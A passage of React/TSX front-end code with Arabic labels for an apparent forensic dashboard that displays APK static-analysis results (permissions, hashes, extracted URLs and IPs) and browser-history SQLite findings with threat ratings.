                            التقرير الجنائي الفني لتقييم تطبيق الأندرويد (Neural-X Daemon Verdict)
                          </h2>
                          <p className="text-xs text-gray-400 font-mono">
                            Engine: {apkAiReport.modelUsed} • Assessed: {formatTimestampSafe(apkAiReport.analyzedAt)} • تم التحديث في سجل التهديدات والعمليات
                          </p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className={`px-3 py-1.5 rounded-xl text-xs font-bold border ${
                          apkAiReport.isSpyware
                            ? 'bg-red-500/20 text-red-300 border-red-500/40'
                            : apkAiReport.riskLevel === 'متوسط'
                            ? 'bg-amber-500/20 text-amber-300 border-amber-500/40'
                            : 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                        }`}>
                          {apkAiReport.classification} ({apkAiReport.riskLevel})
                        </span>
                      </div>
                    </div>

                    <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                      <div className="text-xs font-bold text-[#D4AF37]">الخلاصة الجنائية التنفيذية (Executive Summary)</div>
                      <p className="text-sm text-gray-200 leading-relaxed whitespace-pre-wrap">
                        {apkAiReport.executiveSummary}
                      </p>
                    </div>

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-3">
                        <div className="text-xs font-bold text-red-400 flex items-center gap-1.5">
                          <AlertTriangle className="w-4 h-4" />
                          مؤشرات السلوك التجسسي والمخاطر المكتشفة
                        </div>
                        {apkAiReport.spywareIndicators.length > 0 ? (
                          <ul className="space-y-2">
                            {apkAiReport.spywareIndicators.map((ind, i) => (
                              <li key={i} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800 flex items-start gap-2">
                                <span className="w-1.5 h-1.5 rounded-full bg-red-400 mt-1.5 shrink-0" />
                                <span>{ind}</span>
                              </li>
                            ))}
                          </ul>
                        ) : (
                          <p className="text-xs text-emerald-400">لم تُرصد مؤشرات تجسس أو استغلال صريح.</p>
                        )}
                      </div>

                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-3">
                        <div className="text-xs font-bold text-emerald-400 flex items-center gap-1.5">
                          <Globe className="w-4 h-4" />
                          تقييم اتصالات الشبكة والخوادم (Network / C2 Assessment)
                        </div>
                        <p className="text-xs text-gray-300 leading-relaxed bg-gray-900 p-3 rounded-lg border border-gray-800">
                          {apkAiReport.networkAssessment}
                        </p>
                        <div className="text-xs font-bold text-[#D4AF37] pt-1">التوصيات الأمنية</div>
                        <ul className="space-y-1.5">
                          {apkAiReport.recommendations.map((rec, i) => (
                            <li key={i} className="text-xs text-gray-300 flex items-start gap-2">
                              <CheckCircle2 className="w-3.5 h-3.5 text-[#D4AF37] mt-0.5 shrink-0" />
                              <span>{rec}</span>
                            </li>
                          ))}
                        </ul>
                      </div>
                    </div>

                    {apkAiReport.permissionsAssessment && apkAiReport.permissionsAssessment.length > 0 && (
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-3">
                        <div className="text-xs font-bold text-[#D4AF37] flex items-center gap-1.5">
                          <Lock className="w-4 h-4" />
                          تقييم Neural-X Security Daemon للأذونات الحساسة المرصودة
                        </div>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
                          {apkAiReport.permissionsAssessment.map((pa, idx) => (
                            <div key={idx} className="p-3 bg-gray-900 rounded-lg border border-gray-800 space-y-1">
                              <div className="flex items-center justify-between gap-2">
                                <span className="text-[11px] font-mono font-bold text-white truncate" dir="ltr" title={pa.permission}>
                                  {pa.permission}
                                </span>
                                <span className="px-2 py-0.5 rounded bg-[#D4AF37]/15 text-[#D4AF37] text-[10px] font-bold shrink-0">
                                  {pa.risk}
                                </span>
                              </div>
                              <p className="text-[11px] text-gray-400 leading-relaxed">{pa.reason}</p>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* SHA-256 & Binary APK Metadata */}
                <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <h3 className="text-sm font-bold text-white flex items-center gap-2">
                      <Cpu className="w-4 h-4 text-[#D4AF37]" />
                      البنية الثنائية وبصمة SHA-256 لحزمة APK
                    </h3>
                    <span className="text-[11px] font-mono text-gray-400">
                      Manifest Format: <span className="text-emerald-400">{apkStaticResult.manifestFormat}</span> • Entropy: <span className="text-[#D4AF37]">{apkStaticResult.entropy}/8.0</span>
                    </span>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3 font-mono text-xs">
                    <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                      <span className="text-[10px] text-gray-500 block mb-1">SHA-256 Digest</span>
                      <span className="text-emerald-400 break-all select-all">{apkStaticResult.sha256}</span>
                    </div>
                    <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                      <span className="text-[10px] text-gray-500 block mb-1">ملفات DEX والمكتبات والشهادات</span>
                      <span className="text-gray-300 block">
                        DEX: {apkStaticResult.dexFiles.join(', ') || 'غير متوفر'} | SO Libs: {apkStaticResult.nativeLibs.length} | Certs: {apkStaticResult.certFiles.join(', ') || 'لا يوجد'}
                      </span>
                    </div>
                  </div>
                  {apkStaticResult.suspiciousTriggers.length > 0 && (
                    <div className="bg-amber-950/20 border border-amber-500/30 p-3 rounded-xl">
                      <div className="text-xs font-bold text-amber-300 mb-1.5">محفزات نظام وخدمات حساسة مرصودة في AndroidManifest.xml:</div>
                      <div className="flex flex-wrap gap-1.5">
                        {apkStaticResult.suspiciousTriggers.map((trg, idx) => (
                          <span key={idx} className="px-2 py-0.5 bg-amber-500/10 border border-amber-500/30 text-amber-300 rounded font-mono text-[11px]">
                            {trg}
                          </span>
                        ))}
                      </div>
                    </div>
                  )}
                </div>

                {/* Extracted Permissions Table */}
                <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-gray-800">
                    <div>
                      <h3 className="text-sm font-bold text-white flex items-center gap-2">
                        <Lock className="w-4 h-4 text-[#D4AF37]" />
                        الأذونات المستخرجة من AndroidManifest.xml ({apkStaticResult.permissions.length})
                      </h3>
                      <p className="text-xs text-gray-400">تصنيف آلي للأذونات الحساسة والخطيرة التي يطلبها التطبيق.</p>
                    </div>
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => setApkPermFilter('all')}
                        className={`px-3 py-1.5 rounded-lg text-xs font-bold transition ${
                          apkPermFilter === 'all' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-400 border border-gray-800'
                        }`}
                      >
                        الكل ({apkStaticResult.permissions.length})
                      </button>
                      <button
                        onClick={() => setApkPermFilter('sensitive')}
                        className={`px-3 py-1.5 rounded-lg text-xs font-bold transition ${
                          apkPermFilter === 'sensitive' ? 'bg-red-500 text-white' : 'bg-gray-950 text-gray-400 border border-gray-800'
                        }`}
                      >
                        الحساسة فقط ({apkStaticResult.sensitivePermissionsCount})
                      </button>
                    </div>
                  </div>

                  {apkStaticResult.permissions.length > 0 ? (
                    <div className="overflow-x-auto max-h-[400px] overflow-y-auto">
                      <table className="w-full text-right text-xs">
                        <thead className="bg-gray-950 text-gray-400 sticky top-0 border-b border-gray-800">
                          <tr>
                            <th className="p-3">الإذن (Permission)</th>
                            <th className="p-3">التصنيف</th>
                            <th className="p-3">الخطورة</th>
                            <th className="p-3">التأثير الأمني</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-gray-800">
                          {apkStaticResult.permissions
                            .filter(p => apkPermFilter === 'all' || p.severity === 'critical' || p.severity === 'high')
                            .map((perm, idx) => (
                              <tr key={idx} className="hover:bg-gray-800/30">
                                <td className="p-3 font-mono text-white" dir="ltr">
                                  <div className="font-bold text-[#D4AF37]">{perm.shortName}</div>
                                  <div className="text-[10px] text-gray-500">{perm.name}</div>
                                </td>
                                <td className="p-3 text-gray-300">{perm.category}</td>
                                <td className="p-3">
                                  <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${
                                    perm.severity === 'critical'
                                      ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                                      : perm.severity === 'high'
                                      ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                                      : perm.severity === 'medium'
                                      ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                                      : 'bg-gray-800 text-gray-400'
                                  }`}>
                                    {perm.severity}
                                  </span>
                                </td>
                                <td className="p-3 text-gray-400">{perm.description}</td>
                              </tr>
                            ))}
                        </tbody>
                      </table>
                    </div>
                  ) : (
                    <div className="text-center py-8 text-xs text-gray-500">
                      لم يُعثر على أذونات `android.permission.*` صريحة في ملف AndroidManifest.xml.
                    </div>
                  )}
                </div>

                {/* Extracted URLs & IP Addresses Grid */}
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                  {/* URLs */}
                  <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3 border-b border-gray-800">
                      <h3 className="text-sm font-bold text-white flex items-center gap-2">
                        <Link className="w-4 h-4 text-[#D4AF37]" />
                        الروابط المستخرجة (URLs)
                      </h3>
                      <div className="flex items-center gap-1.5">
                        <button
                          onClick={() => setApkUrlFilter('endpoints')}
                          className={`px-2.5 py-1 rounded text-[11px] font-bold ${
                            apkUrlFilter === 'endpoints' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-400'
                          }`}
                        >
                          نقاط الاتصال ({apkStaticResult.endpointUrlsCount})
                        </button>
                        <button
                          onClick={() => setApkUrlFilter('suspicious')}
                          className={`px-2.5 py-1 rounded text-[11px] font-bold ${
                            apkUrlFilter === 'suspicious' ? 'bg-red-500 text-white' : 'bg-gray-950 text-gray-400'
                          }`}
                        >
                          مشبوهة/HTTP
                        </button>
                        <button
                          onClick={() => setApkUrlFilter('all')}
                          className={`px-2.5 py-1 rounded text-[11px] font-bold ${
                            apkUrlFilter === 'all' ? 'bg-gray-700 text-white' : 'bg-gray-950 text-gray-400'
                          }`}
                        >
                          الكل ({apkStaticResult.urls.length})
                        </button>
                      </div>
                    </div>

                    <div className="space-y-2 max-h-[380px] overflow-y-auto">
                      {apkStaticResult.urls
                        .filter(u =>
                          apkUrlFilter === 'all'
                            ? true
                            : apkUrlFilter === 'suspicious'
                            ? u.riskTag === 'suspicious' || u.riskTag === 'insecure_http'
                            : !u.isStandardSchema
                        )
                        .map((u, idx) => (
                          <div key={idx} className="p-3 bg-gray-950 rounded-xl border border-gray-800 space-y-1">
                            <div className="flex items-center justify-between gap-2">
                              <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
                                u.riskTag === 'suspicious'
                                  ? 'bg-red-500/20 text-red-400'
                                  : u.riskTag === 'insecure_http'
                                  ? 'bg-amber-500/20 text-amber-400'
                                  : u.isStandardSchema
                                  ? 'bg-gray-800 text-gray-400'
                                  : 'bg-emerald-500/15 text-emerald-400'
                              }`}>
                                {u.riskTag}
                              </span>
                              <span className="text-[10px] font-mono text-gray-500">
                                {u.sourceFile} ({u.occurrences}x)
                              </span>
                            </div>
                            <div className="text-xs font-mono text-gray-200 break-all select-all" dir="ltr">
                              {u.url}
                            </div>
                          </div>
                        ))}
                      {apkStaticResult.urls.filter(u =>
                        apkUrlFilter === 'all' ? true : apkUrlFilter === 'suspicious' ? u.riskTag === 'suspicious' || u.riskTag === 'insecure_http' : !u.isStandardSchema
                      ).length === 0 && (
                        <div className="text-center py-8 text-xs text-gray-500">لا توجد روابط مطابقة لهذا الفلتر داخل التطبيق.</div>
                      )}
                    </div>
                  </div>

                  {/* IP Addresses */}
                  <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                    <div className="flex items-center justify-between pb-3 border-b border-gray-800">
                      <h3 className="text-sm font-bold text-white flex items-center gap-2">
                        <Network className="w-4 h-4 text-[#D4AF37]" />
                        عناوين الـ IP المستخرجة ({apkStaticResult.ips.length})
                      </h3>
                      <span className="text-[11px] font-mono text-gray-400">DEX / Config / Native Strings</span>
                    </div>

                    <div className="space-y-2 max-h-[380px] overflow-y-auto">
                      {apkStaticResult.ips.map((item, idx) => (
                        <div key={idx} className="p-3 bg-gray-950 rounded-xl border border-gray-800 flex items-center justify-between gap-3">
                          <div className="space-y-1">
                            <div className="text-sm font-mono font-bold text-[#D4AF37] select-all" dir="ltr">
                              {item.ip}
                            </div>
                            <div className="text-[11px] text-gray-400">
                              {item.classification} • <span className="font-mono text-gray-500">{item.sourceFile}</span>
                            </div>
                          </div>
                          <span className={`px-2 py-1 rounded text-[10px] font-bold font-mono shrink-0 ${
                            item.isPrivate ? 'bg-gray-800 text-gray-400' : 'bg-red-500/15 text-red-400 border border-red-500/30'
                          }`}>
                            {item.isPrivate ? 'PRIVATE' : 'PUBLIC'} • {item.occurrences}x
                          </span>
                        </div>
                      ))}
                      {apkStaticResult.ips.length === 0 && (
                        <div className="text-center py-8 text-xs text-gray-500">لم يتم العثور على عناوين IPv4 مضمنة في ملفات الحزمة.</div>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            )}

            {!apkStaticResult && !apkAnalyzing && (
              <div className="rounded-2xl bg-gray-900/50 border border-dashed border-gray-800 p-12 text-center space-y-3">
                <Smartphone className="w-12 h-12 text-gray-600 mx-auto" />
                <h3 className="text-base font-bold text-gray-300">لم تقم برفع أي ملف APK بعد</h3>
                <p className="text-xs text-gray-500 max-w-xl mx-auto leading-relaxed">
                  اسحب وأفلت ملف <code className="text-[#D4AF37]">.apk</code> هنا لاستخراج الأذونات الحساسة من <code className="text-emerald-400">AndroidManifest.xml</code> وجميع الروابط وعناوين الـ IP وتحليلها عبر وحدة Sovereign Core Engine v3.5.
                </p>
              </div>
            )}
          </div>
        )}

        {/* Tab: Browser History & SQLite Artifact Extractor */}
        {isTabVisible('browser') && (
          <div className="space-y-6">
            <div
              onDragOver={(e) => { e.preventDefault(); setIsDraggingBrowser(true); }}
              onDragLeave={() => setIsDraggingBrowser(false)}
              onDrop={(e) => {
                e.preventDefault();
                setIsDraggingBrowser(false);
                const dropped = e.dataTransfer.files?.[0];
                if (dropped) handleBrowserSqliteUpload(dropped);
              }}
              className={`rounded-2xl bg-gradient-to-r from-gray-900 via-gray-900/95 to-gray-950 border-2 p-8 shadow-2xl transition ${
                isDraggingBrowser ? 'border-[#D4AF37] bg-[#D4AF37]/5' : 'border-gray-800'
              }`}
            >
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
                <div className="space-y-3 max-w-3xl">
                  <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/30 text-[#D4AF37] text-xs font-mono">
                    <Database className="w-3.5 h-3.5" />
                    BROWSER HISTORY & SQLITE ARTIFACT EXTRACTOR • AUTOMATED PARSER CORE v3.5
                  </div>
                  <h1 className="text-2xl md:text-3xl font-bold text-white">
                    مختبر استخراج وتحليل قواعد بيانات المتصفحات (SQLite Browser Forensics)
                  </h1>
                  <p className="text-gray-400 text-sm leading-relaxed">
                    قراءة مباشرة وفعلية لقواعد بيانات المتصفحات بصيغة SQLite3 مثل ملف <code className="text-[#D4AF37]">History</code> (Chrome / Edge / Brave)، و<code className="text-emerald-400">places.sqlite</code> (Firefox)، و<code className="text-blue-400">History.db</code> (Safari). يتم استخراج الجداول والروابط وتحويل تواريخ WebKit وPRTime وCocoa بدقة ثم إرسالها لوحدة Automated Parser Core لكشف المواقع المشبوهة وتحديث لوحة القيادة فوراً.
                  </p>
                </div>

                <div className="flex flex-wrap items-center gap-3 shrink-0">
                  <label className="cursor-pointer inline-flex items-center gap-2.5 px-6 py-3.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl shadow-lg hover:opacity-95 transition text-sm">
                    <Upload className="w-5 h-5" />
                    رفع قاعدة بيانات SQLite / History
                    <input
                      type="file"
                      accept=".sqlite,.sqlite3,.db,application/x-sqlite3,application/octet-stream,*"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        e.target.value = '';
                        if (f) handleBrowserSqliteUpload(f);
                      }}
                      className="hidden"
                    />
                  </label>
                  {browserStaticResult && (
                    <button
                      onClick={downloadBrowserJsonReport}
                      className="px-4 py-3.5 bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-bold rounded-xl border border-gray-700 transition flex items-center gap-2"
                    >
                      <Download className="w-4 h-4 text-[#D4AF37]" />
                      تصدير تقرير JSON
                    </button>
                  )}
                </div>
              </div>
            </div>

            {browserAnalyzing && (
              <div className="rounded-2xl bg-gray-900 border border-[#D4AF37]/40 p-10 text-center space-y-4">
                <RefreshCw className="w-10 h-10 text-[#D4AF37] animate-spin mx-auto" />
                <h3 className="text-lg font-bold text-white">
                  {browserStage === 'extracting'
                    ? 'جاري فتح قاعدة بيانات SQLite واستخراج الجداول والروابط وتواريخ الزيارات...'
                    : 'جاري إرسال سجلات التصفح إلى Automated Parser Core لتحليل السلوك وكشف المواقع المشبوهة...'}
                </h3>
                <p className="text-xs text-gray-400 font-mono">
                  {browserStage === 'extracting'
                    ? 'SQLite3 Binary Verification • WebKit/PRTime/Cocoa Timestamp Decoding • SHA-256'
                    : 'Automated Parser Core v3.5 • Phishing & C2 Correlator • Real-time Dashboard Update'}
                </p>
              </div>
            )}

            {browserError && (
              <div className="rounded-2xl bg-red-950/30 border border-red-500/40 p-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div className="flex items-start gap-3 text-red-300">
                  <AlertOctagon className="w-6 h-6 shrink-0 mt-0.5 text-red-400" />
                  <div className="space-y-1">
                    <div className="text-sm font-bold text-red-200">تشخيص حالة التحليل عبر Automated Parser Core</div>
                    <p className="text-xs leading-relaxed font-mono break-all">{browserError}</p>
                  </div>
                </div>
                {browserStaticResult && !browserAnalyzing && (
                  <button
                    onClick={() => evaluateBrowserHistoryWithParserCore(browserStaticResult)}
                    className="px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition shrink-0 flex items-center gap-1.5"
                  >
                    <RefreshCw className="w-3.5 h-3.5" />
                    إعادة الفحص عبر Automated Parser
                  </button>
                )}
              </div>
            )}

            {browserStaticResult && (
              <div className="space-y-6">
                {/* Summary KPI Strip */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
                  <div className="bg-gray-900 border border-gray-800 p-5 rounded-2xl space-y-1">
                    <span className="text-[10px] text-gray-500 uppercase font-mono">محرك المتصفح المكتشف</span>
                    <div className="text-xs font-bold text-white leading-snug" title={browserStaticResult.browserLabel}>
                      {browserStaticResult.browserLabel}
                    </div>
                    <div className="text-[11px] text-gray-400 font-mono">
                      {formatFileSize(browserStaticResult.fileSize)} • {browserStaticResult.tables.length} جدول SQLite
                    </div>
                  </div>

                  <div className="bg-gray-900 border border-gray-800 p-5 rounded-2xl space-y-1">
                    <span className="text-[10px] text-gray-500 uppercase font-mono">الروابط المستخرجة</span>
                    <div className="text-2xl font-bold text-[#D4AF37] font-mono">
                      {browserStaticResult.totalUrlsCount}
                    </div>
                    <div className="text-[11px] text-amber-400 font-bold">
                      {browserStaticResult.flaggedUrlsCount} رابط بمؤشر محلي
                    </div>
                  </div>

                  <div className="bg-gray-900 border border-gray-800 p-5 rounded-2xl space-y-1">
                    <span className="text-[10px] text-gray-500 uppercase font-mono">سجل الزيارات الزمني</span>
                    <div className="text-2xl font-bold text-emerald-400 font-mono">
                      {browserStaticResult.totalVisitsCount}
                    </div>
                    <div className="text-[11px] text-gray-400">
                      التنزيلات: {browserStaticResult.downloads.length} • البحث: {browserStaticResult.searchTerms.length}
                    </div>
                  </div>

                  <div className="bg-gray-900 border border-gray-800 p-5 rounded-2xl space-y-1">
                    <span className="text-[10px] text-gray-500 uppercase font-mono">النطاق الزمني للسجل</span>
                    <div className="text-[11px] font-bold text-blue-300 font-mono">
                      من: {browserStaticResult.dateRangeStart ? formatTimestampSafe(browserStaticResult.dateRangeStart) : 'غير متوفر'}
                    </div>
                    <div className="text-[11px] font-bold text-blue-300 font-mono">
                      إلى: {browserStaticResult.dateRangeEnd ? formatTimestampSafe(browserStaticResult.dateRangeEnd) : 'غير متوفر'}
                    </div>
                  </div>

                  <div
                    className={`border p-5 rounded-2xl space-y-1 ${
                      browserAiReport?.hasSuspiciousActivity
                        ? 'bg-red-950/30 border-red-500/50'
                        : browserAiReport
                        ? 'bg-emerald-950/20 border-emerald-500/40'
                        : 'bg-gray-900 border-gray-800'
                    }`}
                  >
                    <span className="text-[10px] text-gray-400 uppercase font-mono">تقييم Automated Parser لسلوك التصفح</span>
                    <div
                      className={`text-sm font-bold ${
                        browserAiReport?.hasSuspiciousActivity
                          ? 'text-red-400'
                          : browserAiReport
                          ? 'text-emerald-400'
                          : 'text-gray-400'
                      }`}
                    >
                      {browserAiReport
                        ? browserAiReport.behaviorClassification
                        : browserAnalyzing
                        ? 'جاري التقييم...'
                        : 'بانتظار المحرك'}
                    </div>
                    <div className="text-[11px] font-mono text-gray-300">
                      {browserAiReport
                        ? `درجة التهديد: ${browserAiReport.threatScore}/100 (${browserAiReport.riskLevel})`
                        : `SHA-256: ${browserStaticResult.sha256.substring(0, 12)}...`}
                    </div>
                  </div>
                </div>

                {/* Automated Parser Behavior & Suspicious Sites Forensic Card */}
                {browserAiReport && (
                  <div
                    className={`rounded-2xl border p-6 space-y-5 shadow-2xl ${
                      browserAiReport.hasSuspiciousActivity ||
                      browserAiReport.riskLevel === 'حرج' ||
                      browserAiReport.riskLevel === 'مرتفع'
                        ? 'bg-gradient-to-br from-gray-900 via-gray-900 to-red-950/30 border-red-500/40'
                        : 'bg-gradient-to-br from-gray-900 via-gray-900 to-emerald-950/20 border-emerald-500/30'
                    }`}
                  >
                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-gray-800">
                      <div className="flex items-center gap-3">
                        <div
                          className={`w-11 h-11 rounded-xl flex items-center justify-center border ${
                            browserAiReport.hasSuspiciousActivity
                              ? 'bg-red-500/15 border-red-500/40 text-red-400'
                              : 'bg-emerald-500/15 border-emerald-500/40 text-emerald-400'
                          }`}
                        >
                          {browserAiReport.hasSuspiciousActivity ? (
                            <ShieldAlert className="w-6 h-6" />
                          ) : (
                            <ShieldCheck className="w-6 h-6" />
                          )}
                        </div>
                        <div>
                          <h2 className="text-lg font-bold text-white">
                            التقرير الجنائي لسلوك التصفح وكشف المواقع المشبوهة (Threat Hunting Verdict)
                          </h2>
                          <p className="text-xs text-gray-400 font-mono">
                            Engine: {browserAiReport.modelUsed} • Assessed: {formatTimestampSafe(browserAiReport.analyzedAt)} • تم تحديث عدادات التهديدات ولوحة القيادة
                          </p>
                        </div>
                      </div>
                      <span
                        className={`px-3 py-1.5 rounded-xl text-xs font-bold border self-start md:self-auto ${
                          browserAiReport.hasSuspiciousActivity
                            ? 'bg-red-500/20 text-red-300 border-red-500/40'
                            : browserAiReport.riskLevel === 'متوسط'
                            ? 'bg-amber-500/20 text-amber-300 border-amber-500/40'
                            : 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                        }`}
                      >
                        {browserAiReport.behaviorClassification} ({browserAiReport.riskLevel})
                      </span>
                    </div>

                    <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                      <div className="text-xs font-bold text-[#D4AF37]">الخلاصة الجنائية التنفيذية (Browsing Behavior Summary)</div>
                      <p className="text-sm text-gray-200 leading-relaxed whitespace-pre-wrap">
                        {browserAiReport.executiveSummary}
                      </p>
                    </div>

                    {browserAiReport.suspiciousSites.length > 0 && (
                      <div className="bg-gray-950 p-4 rounded-xl border border-red-500/30 space-y-3">
                        <div className="text-xs font-bold text-red-400 flex items-center gap-1.5">
                          <AlertTriangle className="w-4 h-4" />
                          المواقع والروابط المشبوهة المكتشفة عبر Threat Hunting Daemon ({browserAiReport.suspiciousSites.length})
                        </div>
                        <div className="overflow-x-auto">
                          <table className="w-full text-right text-xs">
                            <thead className="bg-gray-900 text-gray-400 border-b border-gray-800">
                              <tr>
                                <th className="p-2.5">الموقع / الرابط</th>
                                <th className="p-2.5">التصنيف</th>
                                <th className="p-2.5">الخطورة</th>
                                <th className="p-2.5">تاريخ الزيارة</th>
                                <th className="p-2.5">السبب الجنائي</th>
                              </tr>
                            </thead>
                            <tbody className="divide-y divide-gray-800">
                              {browserAiReport.suspiciousSites.map((site, i) => (
                                <tr key={i} className="hover:bg-red-950/15">
                                  <td className="p-2.5 font-mono max-w-xs" dir="ltr">
                                    <div className="font-bold text-red-300">{site.domain}</div>
                                    <div className="text-[10px] text-gray-400 break-all">{site.url}</div>
                                  </td>
                                  <td className="p-2.5 text-amber-300 font-bold">{site.category}</td>
                                  <td className="p-2.5">
                                    <span className="px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/30 text-[10px] font-bold">
                                      {site.severity}
                                    </span>
                                  </td>
                                  <td className="p-2.5 font-mono text-gray-400 whitespace-nowrap">{site.visitDate}</td>
                                  <td className="p-2.5 text-gray-300">{site.reason}</td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      </div>
                    )}

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2.5">
                        <div className="text-xs font-bold text-blue-400">أنماط السلوك والنشاط الزمني المرصودة</div>
                        <ul className="space-y-1.5">
                          {browserAiReport.behaviorPatterns.map((bp, i) => (
                            <li key={i} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800 flex items-start gap-2">
                              <span className="w-1.5 h-1.5 rounded-full bg-blue-400 mt-1.5 shrink-0" />
                              <span>{bp}</span>
                            </li>
                          ))}
                        </ul>
                      </div>
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2.5">
                        <div className="text-xs font-bold text-[#D4AF37]">التوصيات الأمنية وإجراءات التحقيق</div>
                        <ul className="space-y-1.5">
                          {browserAiReport.recommendations.map((rec, i) => (
                            <li key={i} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800 flex items-start gap-2">
                              <CheckCircle2 className="w-3.5 h-3.5 text-[#D4AF37] mt-0.5 shrink-0" />
                              <span>{rec}</span>
                            </li>
                          ))}
                        </ul>
                      </div>
                    </div>
                  </div>
                )}

                {/* Artifact Sub-Tabs & Live SQLite Explorer */}
                <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-5">
                  <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-4 border-b border-gray-800">
                    <div className="flex flex-wrap items-center gap-2">
                      <button
                        onClick={() => setBrowserViewTab('urls')}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                          browserViewTab === 'urls' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-400 border border-gray-800'
                        }`}
                      >
                        الروابط الفريدة ({browserStaticResult.urls.length})
                      </button>
                      <button
                        onClick={() => setBrowserViewTab('visits')}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                          browserViewTab === 'visits' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-400 border border-gray-800'
                        }`}
                      >
                        سجل الزيارات الزمني ({browserStaticResult.visits.length})
                      </button>
                      <button
                        onClick={() => setBrowserViewTab('downloads')}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                          browserViewTab === 'downloads' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-400 border border-gray-800'
                        }`}
                      >
                        التنزيلات ({browserStaticResult.downloads.length})
                      </button>
                      <button
                        onClick={() => setBrowserViewTab('searches')}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                          browserViewTab === 'searches' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-400 border border-gray-800'
                        }`}
                      >
                        كلمات البحث ({browserStaticResult.searchTerms.length})
                      </button>
                      <button
                        onClick={() => setBrowserViewTab('tables')}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                          browserViewTab === 'tables' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-400 border border-gray-800'
                        }`}
                      >
                        جداول SQLite ({browserStaticResult.tables.length})
                      </button>
                    </div>

                    {(browserViewTab === 'urls' || browserViewTab === 'visits') && (
                      <div className="flex flex-wrap items-center gap-2">
                        <div className="relative">
                          <Search className="w-3.5 h-3.5 text-gray-500 absolute right-3 top-1/2 -translate-y-1/2" />
                          <input
                            type="text"
                            value={browserSearchQuery}
                            onChange={(e) => setBrowserSearchQuery(e.target.value)}
                            placeholder="بحث في الروابط أو النطاقات..."
                            className="bg-gray-950 border border-gray-800 rounded-xl pr-8 pl-3 py-1.5 text-xs text-white outline-none focus:border-[#D4AF37] min-w-[210px]"
                          />
                        </div>
                        <button
                          onClick={() => setBrowserOnlyFlagged((prev) => !prev)}
                          className={`px-3 py-1.5 rounded-xl text-xs font-bold border transition ${
                            browserOnlyFlagged
                              ? 'bg-red-500/20 text-red-300 border-red-500/40'
                              : 'bg-gray-950 text-gray-400 border-gray-800'
                          }`}
                        >
                          المعلمة بالمؤشرات فقط ({browserStaticResult.flaggedUrlsCount})
                        </button>
                      </div>
                    )}
                  </div>

                  {/* Sub-tab 1: Unique URLs */}
                  {browserViewTab === 'urls' && (
                    <div className="overflow-x-auto max-h-[460px] overflow-y-auto">
                      <table className="w-full text-right text-xs">
                        <thead className="bg-gray-950 text-gray-400 sticky top-0 border-b border-gray-800">
                          <tr>
                            <th className="p-3">العنوان والرابط (URL)</th>
